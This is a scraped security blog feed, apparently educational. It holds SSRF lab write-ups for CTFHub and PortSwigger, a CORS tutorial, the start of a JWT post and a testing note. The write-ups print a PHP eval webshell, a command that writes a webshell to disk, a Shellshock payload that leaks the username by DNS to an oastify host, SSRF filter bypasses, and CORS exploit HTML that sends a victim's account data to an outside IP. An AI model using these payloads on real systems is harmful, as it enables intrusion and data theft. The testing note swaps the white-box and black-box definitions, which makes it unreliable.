3A%2520http%253A%252F%252Fchallenge-fdbaeb80bf490fcb.sandbox.ctfhub.com%253A10800%252F%253Furl%253D127.0.0.1%252Fflag.php%250D%250ACookie%253A%2520UM_distinctid%253D17bedb2040d988-0aed78614d6fec8-4c3e2778-144000-17bedb2040ff22%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250A-----------------------------3899987496969232395467070377%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25221.php%2522%250D%250AContent-Type%253A%2520application%252Foctet-stream%250D%250A%250D%250AGIF89a%253C%253Fphp%250D%250A%2540eval(%2524_POST%255B\u0026#39;pass\u0026#39;%255D)%253B%250D%250A%253F%253E%250D%250A-----------------------------3899987496969232395467070377%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25E6%258F%2590%25E4%25BA%25A4%25E6%259F%25A5%25E8%25AF%25A2%250D%250A-----------------------------3899987496969232395467070377-- HTTP/1.1 Host: challenge-5b46f441c84cf0b2.sandbox.ctfhub.com:10800 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: close Upgrade-Insecure-Requests: 1 Priority: u=0, i CTFHub\u0026mdash;FastCGI协议 首先要了解Fastcgi协议是什么，这里可以参考下文章\nhttps://segmentfault.com/a/1190000013112052\nhttps://blog.csdn.net/mysteryflower/article/details/94386461\n**CGI**协议的诞生是为了解决**HTTP**协议与编程语言之间的连接问题，从而减低动态页面的开发难度。这个协议避免所有的编程语言开发动态页面时还需要开发一套**HTTP**的解析库。\n**Fastcgi**程序将**CGI**程序的规范都进行了保留，并将其升级，主要是将输入和输出的方式从标准流迁移到了**socket**传输，同时，**fastcgi**协议也支持将**cgi**程序进行守护进程化，这样可以提高请求的处理速度，同时提高了稳定性。\n解题思路使用Gopherus进行文件上传getshell后查看\n1 2 3 python2 gopherus.py --exploit fastcgi echo PD9waHAgQGV2YWwoJFBPU1RfWydjbWQnXSk7Pz4= | base64 -d \u0026gt; /var/www/html/shell.php 读取文件，成功上传\nBurpSuite官方SSRF靶场通关思路 https://portswigger.net/web-security/all-labs 靶场地址\nhttps://portswigger.net/web-security/ssrf WP地址\nhttps://mp.weixin.qq.com/s/ZUFS8ISQv8qm0iCEB0sh6Q\n针对本地服务器的基本 SSRF SSRF存在位置：点击商品\u0026mdash;查看库存\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 POST /product/stock HTTP/2 Host: 0a96007e04d5516c803044a8008d00b4.web-security-academy.net Cookie: session=drqHd3J1bQVeABCIsr8xlErWiXY0x73M User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a96007e04d5516c803044a8008d00b4.web-security-academy.net/product?productId=14 Content-Type: application/x-www-form-urlencoded Content-Length: 60 Origin: https://0a96007e04d5516c803044a8008d00b4.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers stockApi=http://479j8u31i27ddn59ua2qf3b6kxqoeg25.oastify.com 网站要求删除**carlos用户，此时将url地址替换为**http://localhost/admin即可访问\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 POST /product/stock HTTP/2 Host: 0a96007e04d5516c803044a8008d00b4.web-security-academy.net Cookie: session=drqHd3J1bQVeABCIsr8xlErWiXY0x73M User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a96007e04d5516c803044a8008d00b4.web-security-academy.net/product?productId=14 Content-Type: application/x-www-form-urlencoded Content-Length: 31 Origin: https://0a96007e04d5516c803044a8008d00b4.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers stockApi=http://localhost/admin 直接点击删除用户会显示未授权访问，此时还是利用SSRF进行删除\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 POST /product/stock HTTP/2 Host: 0a96007e04d5516c803044a8008d00b4.web-security-academy.net Cookie: session=w2V91qXGsTAuF7nuW4iq0X7Egrs13gt3; session=drqHd3J1bQVeABCIsr8xlErWiXY0x73M User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a96007e04d5516c803044a8008d00b4.web-security-academy.net/product?productId=14 Content-Type: application/x-www-form-urlencoded Content-Length: 60 Origin: https://0a96007e04d5516c803044a8008d00b4.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers stockApi=http%3A%2F%2Flocalhost/admin/delete?username=carlos 针对内网其它服务器的SSRF 漏洞存在位置和6.1一样，也是存在点击商品\u0026mdash;查看库存\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 POST /product/stock HTTP/2 Host: 0a9a00ff04ae70da8260a14a00920027.web-security-academy.net Cookie: session=0RAnL6L1oPU3KBaGc15zbk7fpDtPRvT4 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a9a00ff04ae70da8260a14a00920027.web-security-academy.net/product?productId=2 Content-Type: application/x-www-form-urlencoded Content-Length: 96 Origin: https://0a9a00ff04ae70da8260a14a00920027.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1 题目描述内网IP：192.168.0.某台主机开放8080端口，需要使用该台主机删除用户*carlos**\n对目标主机IP地址进行爆破，发现内网192.168.0.110开放8080端口\n访问/admin目录成功进入管理员后台\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 POST /product/stock HTTP/2 Host: 0a9a00ff04ae70da8260a14a00920027.web-security-academy.net Cookie: session=0RAnL6L1oPU3KBaGc15zbk7fpDtPRvT4 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a9a00ff04ae70da8260a14a00920027.web-security-academy.net/product?productId=2 Content-Type: application/x-www-form-urlencoded Content-Length: 69 Origin: https://0a9a00ff04ae70da8260a14a00920027.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers stockApi=http%3A%2F%2F192.168.0.110:8080/admin/delete?username=carlos 成功删除carlos用户\n****带外检测的盲 SSRF 题目描述：要解决实验问题，请使用此功能向公共 Burp Collaborator 服务器发出 HTTP 请求。\n存在漏洞点在http请求中的referer字段，将referer字段url填写为BP的Collaborator模块即可解决问题\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 GET /product?productId=14 HTTP/2 Host: 0a60008b0446597680c95d4900e500ae.web-security-academy.net Cookie: session=8ukvsS5poaa36dDRTFMKqjGnJdEaQGpU User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: http://w415tlzzvtbm4yb6vny5qnh1psvjja7z.oastify.com Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Priority: u=0, i Te: trailers 具有基于黑名单的输入过滤器的 SSRF 题目描述和6.1\u0026amp;6.2一样，需要删除carlos用户\n漏洞点也是存在****点击商品\u0026mdash;查看库存\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 POST /product/stock HTTP/2 Host: 0a90006d03eb0af084a0223400ef0026.web-security-academy.net Cookie: session=P6vpudOBS7THYsWjfEXNgrzNq5cLydrf User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a90006d03eb0af084a0223400ef0026.web-security-academy.net/product?productId=1 Content-Type: application/x-www-form-urlencoded Content-Length: 37 Origin: https://0a90006d03eb0af084a0223400ef0026.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers stockApi=http%3A%2F%2F127.0.0.1/admin 但是过滤了，不让直接访问内网IP，Bypass\n1 2 环回地址绕过成功 进制绕过失败 但是添加目录又不行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 POST /product/stock HTTP/2 Host: 0ab4001b0453b37d8007358b00d10042.web-security-academy.net Cookie: session=9wniPsfLjEOpp8Q2paREt6txQpEUVq4l User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0ab4001b0453b37d8007358b00d10042.web-security-academy.net/product?productId=2 Content-Type: application/x-www-form-urlencoded Content-Length: 33 Origin: https://0ab4001b0453b37d8007358b00d10042.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers stockApi=http%3A%2F%2F127.1/admin 对目录进行编码绕过，将\u0026quot;a\u0026quot;进行双URL编码为%2561\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 POST /product/stock HTTP/2 Host: 0ab4001b0453b37d8007358b00d10042.web-security-academy.net Cookie: session=9wniPsfLjEOpp8Q2paREt6txQpEUVq4l User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0ab4001b0453b37d8007358b00d10042.web-security-academy.net/product?productId=2 Content-Type: application/x-www-form-urlencoded Content-Length: 31 Origin: https://0ab4001b0453b37d8007358b00d10042.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers stockApi=http://127.1/%2561dmin 通过开放重定向漏洞绕过过滤器的 SSRF 要解决实验问题，请更改库存检查 URL 以访问 Admin 界面， **\u0026lt;font style=\u0026quot;color:rgb(92, 92, 91);\u0026quot;\u0026gt;http://192.168.0.12:8080/admin\u0026lt;/font\u0026gt;** 并删除用户 **\u0026lt;font style=\u0026quot;color:rgb(92, 92, 91);\u0026quot;\u0026gt;carlos\u0026lt;/font\u0026gt;**。\n漏洞功能点：查看详细商品\u0026mdash;Next Product\n单击\u0026quot;next product\u0026quot;并观察到path参数被放置到重定向响应的Location头中，从而导致打开重定向\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 GET /product/nextProduct?currentProductId=2\u0026amp;path=/product?productId=3 HTTP/2 Host: 0a0f0008049d3117812cc0eb009f0017.web-security-academy.net Cookie: session=RvsFc32IvjozAi9Jpn0NpcGGO4j2jiwi; session=8c8YpHoJxmnNr0eT0cYNc7C6ztfCLxn7 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a0f0008049d3117812cc0eb009f0017.web-security-academy.net/product?productId=2 Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Priority: u=0, i Te: trailers 使用DnsLog进行验证，发现存在回显，****创建一个利用开放重定向漏洞的URL，重定向到管理界面，并将其输入股票检查器上的stockApi参数：\nGet提交参数并不会显示信息，因为重定向到内网了\n此时重新回到检查数量功能点，抓包发现请求路径为\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 POST /product/stock HTTP/2 Host: 0a0f0008049d3117812cc0eb009f0017.web-security-academy.net Cookie: session=RvsFc32IvjozAi9Jpn0NpcGGO4j2jiwi; session=8c8YpHoJxmnNr0eT0cYNc7C6ztfCLxn7 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a0f0008049d3117812cc0eb009f0017.web-security-academy.net/product?productId=3 Content-Type: application/x-www-form-urlencoded Content-Length: 65 Origin: https://0a0f0008049d3117812cc0eb009f0017.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers stockApi=/product/stock/check?productId=3\u0026amp;storeId=1 此时将stockApi的路径替换为存在SSRF的路径\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 POST /product/stock HTTP/2 Host: 0a0f0008049d3117812cc0eb009f0017.web-security-academy.net Cookie: session=RvsFc32IvjozAi9Jpn0NpcGGO4j2jiwi; session=8c8YpHoJxmnNr0eT0cYNc7C6ztfCLxn7 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a0f0008049d3117812cc0eb009f0017.web-security-academy.net/product?productId=3 Content-Type: application/x-www-form-urlencoded Content-Length: 65 Origin: https://0a0f0008049d3117812cc0eb009f0017.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin 成功访问到内网信息，成功删除用户 stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos 使用 Shellshock 漏洞的盲 SSRF 题目描述：****本网站使用分析软件，当产品页面加载时，该软件会获取Referer标题中指定的URL。\n要解决实验问题，请使用此功能对端口8080上的192.168.0.X范围内的内部服务器执行SSRF盲攻击。在盲目攻击中，对内部服务器使用Shellshock有效负载以泄漏操作系统用户的名称\n漏洞点还是存在Http头的Referer字段,发送的bp进行主动扫描，发现UA字段存在外带\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 GET /product?productId=1 HTTP/2 Host: 0a9100de047ed21f812c483700c10016.web-security-academy.net Cookie: session=6nguy31YigoG8xuNqE55PbrvBqNOMBdQ User-Agent: () { :; }; /usr/bin/nslookup $(whoami).6ahbphz9r7tozk7rl6y75ygx2o8fw9ky.oastify.com Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://192.168.0.1:8080 Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Priority: u=0, i Te: trailers 在UA头添加以下字段：() { :; }; /usr/bin/nslookup $(whoami).3qu85ef6749lfhno13e4lvwuilocc70w.oastify.com 在存在SSRF的Referer字段添加：https://192.168.0.1:8080，并使用bp模块遍历IP 此时Dnslog成功接收到请求，成功将系统用户名外带出来\n具有基于白名单的输入过滤器的 SSRF 实验要求：要解决实验问题：更改库存检查URL以访问管理界面http：//localhost/admin，并删除用户carlos\n漏洞点：检查库存\n直接修改为自己的Dnslog地址，提示URL只能为stock.weliketoshop.net\n将URL改为：http://username@stock.weliketoshop.net/，并观察其是否被接受，结果表明URL解析器支持嵌入式凭据\n使用#看是否能够隔断，发现不行，将#号进行两次url编码，成功绕过%2523\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 POST /product/stock HTTP/2 Host: 0a9700dc04e82ba08234071c003f00c4.web-security-academy.net Cookie: session=TSWdg1iN25RFgtSZQ9eqsoXh9qwCZu1s User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a9700dc04e82ba08234071c003f00c4.web-security-academy.net/product?productId=1 Content-Type: application/x-www-form-urlencoded Content-Length: 85 Origin: https://0a9700dc04e82ba08234071c003f00c4.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos 成功绕过\nSRC中SSRF漏洞挖掘 利用SSRF漏洞读取云服务元数据\n浅谈云上攻防\u0026ndash;SSRF漏洞带来的新威胁\nSRC实战|文件导出功能的SSRF\nSRC实战之云服务器全回显SSRF（新思路）\n","date":"2025-06-12T22:59:16+08:00","image":"https://lserein.github.io/p/ssrf/ssrf_hu_9bc9f653dbaec1fd.jpg","permalink":"https://lserein.github.io/p/ssrf/","title":"SSRF"},{"content":"1.白盒测试 定义：黑盒测试是一种不关注程序内部结构或实现细节，只关注软件的输入和输出的测试方法。测试人员把软件看作一个“黑盒子”，只根据需求规格说明书来设计测试用例。\n常见白盒测试方法：\n**语句覆盖：**被测程序中每个语句至少执行一次 **判定覆盖：**不仅每个语句必须至少执行一次，而且每个判定的每种可能的结果都应该至少执行一次 条件覆盖: 每个判定中的每个条件至少执行1次 判定条件覆盖 路径覆盖 组合覆盖 1 2 3 4 5 6 //以这个例子完成白盒测试 if A and B then Action1 if C or D then Action2 1.1.语句覆盖 选择足够多的测试数据，使被测程序中每个语句至少执行一次。\n在上面例子中，语句有两条，Action1和Action2\n1 2 3 4 A and B -\u0026gt; True ===\u0026gt; A=True \u0026amp;\u0026amp; B=True C or D -\u0026gt; True ===\u0026gt; C=True or D=True test1: A=true,B=true,C=true,d=true //语句覆盖 1.2.判定覆盖\u0026mdash;也叫分支覆盖 每个判断真假至少执行1次\n1 2 3 4 5 6 7 8 9 10 上面例子中： 判定 A and B C or D 条件：A B C D 判定覆盖测试用例： A and B ===T ===\u0026gt; A=T，B=T 1 A and B ===F ===\u0026gt; A=T，B=F 2 C or D ===T ===\u0026gt; C=T, D=T 3 C or D ===F ===\u0026gt; C=F, D=F 4 test1 A=T,B=T,C=T,D=F 1，3 test2 A=T，B=F，C=F，D=F 2，4 1.3.条件覆盖 每个判定中的每个条件至少执行1次\n1 2 3 4 5 6 条件覆盖，每个条件至少取一次真假 A True False B True False C True False D True False 5 6 test1 A=T，B=T，C=T，D=T test2 A=F，B=F，C=F，D=F 1.4.判定条件覆盖 就是判定覆盖和条件覆盖组合起来，既要让每个判定取一次真假，也要让每个条件取一次真假\n1 2 3 4 5 6 7 8 9 10 11 12 判定覆盖测试用例： A and B ===T ===\u0026gt; A=T，B=T 1 A and B ===F ===\u0026gt; A=T，B=F 2 C or D ===T ===\u0026gt; C=T, D=T 3 C or D ===F ===\u0026gt; C=F, D=F 4 A True False B True False C True False D True False 5 6 test1 A=T,B=T,C=T,D=T 1,3,5 test2 A=F,B=F,C=F,D=F 2,4,6 1.5.路径覆盖 把程序每条路径走一遍\n1 2 3 4 5 6 7 8 9 (x\u0026gt;3) and (z\u0026lt;10) 真 假 action1 () （x==4） or (y\u0026gt;5) （x==4） or (y\u0026gt;5) 真 假 真 假 action2 action2 action3 action3 action3 action3 test1 x=4,z=9,y=6 路径1 test2 x=5,z=9,y=1 路径2 test3 x=2,z=9,y=6 路径3 test4 x=2,z=9,y=1 路径4 1.6.组合覆盖\u0026mdash;也叫条件组合覆盖 把每个判定中的条件组合\n1 2 3 4 5 6 7 8 9 10 11 12 Verdict: A and B C OR D Combined coverage: A B C D T F T F test1 T T T T test2 F T F T test3 F F F F test4 2.黑盒测试 定义：白盒测试是一种关注程序内部结构、实现逻辑和代码路径的测试方法。测试人员需要了解程序的内部代码，根据代码逻辑设计测试用例，以验证程序内部的正确性。\n常见黑盒测试方法：\n等价类划分 边界值分析 因果图 判定表 场景测试 2.1.等价类划分 步骤：找出限制条件\n划分有效等价类和无效等价类\n输入测试数据覆盖等价类\n2.2.边界值分析 2.3.因果图 2.4.判定表 ","date":"2025-06-12T12:15:50+08:00","image":"https://lserein.github.io/p/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95%E4%B8%8E%E7%99%BD%E7%9B%92%E6%B5%8B%E8%AF%95/test_hu_b4c722d0cdcc3bb.jpg","permalink":"https://lserein.github.io/p/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95%E4%B8%8E%E7%99%BD%E7%9B%92%E6%B5%8B%E8%AF%95/","title":"黑盒测试与白盒测试"},{"content":"什么是CORS CORS（Cross-Origin Resource Sharing，跨域资源共享）是一种现代Web技术，用于解决浏览器的同源策略限制，允许不同源的Web应用安全地进行跨域HTTP请求。该机制通过允许服务器标示除了它自己以外的其他源，使得其它浏览器允许这些域加载自己的资源。\n1 2 3 4 5 6 7 8 9 10 如何标识呢：通过Http响应头标识 如：Origin：* //表示所有请求均可 Origin：https://www.bilibili.com //只允许哔哩哔哩的请求 服务端响应头部 Access-Control-Allow-Origin：指定允许访问资源的源（如*表示允许所有源，或指定具体域名） Access-Control-Allow-Methods：允许的HTTP方法（如GET, POST, PUT） Access-Control-Allow-Headers：允许的自定义头部（如X-Custom-Header） Access-Control-Allow-Credentials：是否允许发送Cookie（值为true） Access-Control-Max-Age：预检请求结果的缓存时间（秒） 什么是浏览器同源策略 同源策略是浏览器的一种安全机制，它阻止一个源（origin）的文档或脚本访问另一个源的资源。同源的定义是：\n1 2 3 协议相同（http/https） 域名相同 端口相同 CORS的工作机制 简单请求 1 2 直接F12在浏览器控制台上 fetch(\u0026#39;https://www.baidu.com\u0026#39;) 简单请求：只使用了Get/POST/Head的请求，并且请求头只使用：Accept/Content-Type,浏览器会直接发起请求,然后检查服务端的http头，对于正常内容则加载\n非简单请求 非简单请求：浏览器会发起一个Option方法来预检服务器是否允许当前域访问请求资源\n为什么使用CORS 保护服务器，有助于减轻服务器的负载与风险 保护隐私，CORS限制了敏感数据的访问 安全考虑，防止盗取用户数据或进行CSRF攻击 如何解决CORS问题 1-同源策略（增加反向代理）；\n2-正确设置 CORS 标头，正确响应 Options 预检请求；\n3-使用Jsonp\nCORS漏洞案例 如何发现这种漏洞，当返回数据包中存在敏感信息时，如APIKey，账号密码，身份证等信息时就可以进行CORS测试\n如果返回头是以下情况，那么是最好利用的，高风险\n1 2 3 4 5 6 Access-Control-Allow-Origin：https://www.test.com Access-Control-Allow-Credentials:true //也可以认为是高危，只是漏洞利用起来麻烦一点 Access-Control-Allow-Origin：null //注意是小写 Access-Control-Allow-Credentials:true 低风险常见于配置错误，因为CORS安全机制阻止了这种情况下的漏洞利用\n1 2 Access-Control-Allow-Origin：* Access-Control-Allow-Credentials:true 不存在漏洞情况\n1 2 Access-Control-Allow-Origin：Null //小写才存在CORS漏洞，大写表示不存在 Access-Control-Allow-Credentials:true 具有基本源反射的 CORS 漏洞 1 2 3 在请求包中添加响应头 Origin: https://www.baidu.com 如果返回包正常返回 1 2 3 4 5 6 7 8 9 10 11 12 13 14 GET /accountDetails HTTP/2 Host: 0a84003e03504173801153c700a900ba.web-security-academy.net Origin: https://www.test.com Cookie: session=kL0xYb4ZOonl9QChIoXGQaZZQNpMU2e8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: https://0a84003e03504173801153c700a900ba.web-security-academy.net/my-account?id=wiener Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=4 Te: trailers 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;!-- cors.html --\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;cors exp\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var req = new XMLHttpRequest(); req.onload = reqListener; //替换为存在漏洞的地址即可 req.open(\u0026#34;GET\u0026#34;, \u0026#34;https://0a84003e03504173801153c700a900ba.web-security-academy.net/accountDetails\u0026#34;,\u0026#39;true\u0026#39;); req.withCredentials = true; req.send(\u0026#39;{}\u0026#39;); function reqListener(){ alert(this.responseText); //自己服务器记录日志的地址 location=\u0026#39;http://http://47.76.47.203:8232/?key=\u0026#39;+this.responseText; }; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ","date":"2025-06-11T10:53:33+08:00","image":"https://lserein.github.io/p/cors/cors_hu_23fa8f5a89180dc9.jpg","permalink":"https://lserein.github.io/p/cors/","title":"CORS"},{"content":"什么是JWT https://xz.aliyun.com/t/6776\nJWT的全称是Json Web Token。它遵循JSON格式，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。\njwt由三个部分组成：header-payload-signature\nheader头 header部分最常用的两个字段是alg和typ，alg指定了token加密使用的算法（最常用的为HMAC和RSA算法），typ声明类型为JWT\n1 2 3 4 { \u0026#34;alg\u0026#34; : \u0026#34;HS256\u0026#34;, \u0026#34;typ\u0026#34; : \u0026#34;jwt\u0026#34; } payload部分 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 { \u0026#34;user_role\u0026#34; : \u0026#34;finn\u0026#34;, //当前登录用户 \u0026#34;iss\u0026#34;: \u0026#34;admin\u0026#34;, //该JWT的签发者 \u0026#34;iat\u0026#34;: 1573440582, //签发时间 \u0026#34;exp\u0026#34;: 1573940267, //过期时间 \u0026#34;nbf\u0026#34;: 1573440582, //该时间之前不接收处理该Token \u0026#34;domain\u0026#34;: \u0026#34;example.com\u0026#34;, //面向的用户 \u0026#34;jti\u0026#34;: \u0026#34;dff4214121e83057655e10bd9751d657\u0026#34; //Token唯一标识 } { \u0026#34;name\u0026#34;: null, \u0026#34;id\u0026#34;: 20, \u0026#34;username\u0026#34;: \u0026#34;Lsec\u0026#34;, \u0026#34;exp\u0026#34;: 1735428521 //时间戳 } signature部分 signature的功能是保护token完整性。\n生成方法为将header和payload两个部分联结起来，然后通过header部分指定的算法，计算出签名。\n抽象成公式就是\n1 signature = HMAC-SHA256(base64urlEncode(header) + \u0026#39;.\u0026#39; + base64urlEncode(payload), secret_key) 值得注意的是，编码header和payload时使用的编码方式为base64urlencode，base64url编码是base64的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充\u0026quot;=\u0026ldquo;号，并将标准Base64中的\u0026rdquo;+\u0026ldquo;和\u0026rdquo;/\u0026ldquo;分别改成了\u0026rdquo;-\u0026ldquo;和\u0026rdquo;-\u0026quot;。\nPython生成Token 1 2 3 4 5 import jwt encoded_jwt = jwt.encode({\u0026#39;user_name\u0026#39;: \u0026#39;admin\u0026#39;}, \u0026#39;key\u0026#39;, algorithm=\u0026#39;HS256\u0026#39;) print(encoded_jwt) print(jwt.decode(encoded_jwt, \u0026#39;key\u0026#39;, algorithms=[\u0026#39;HS256\u0026#39;])) Java生成Token 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // 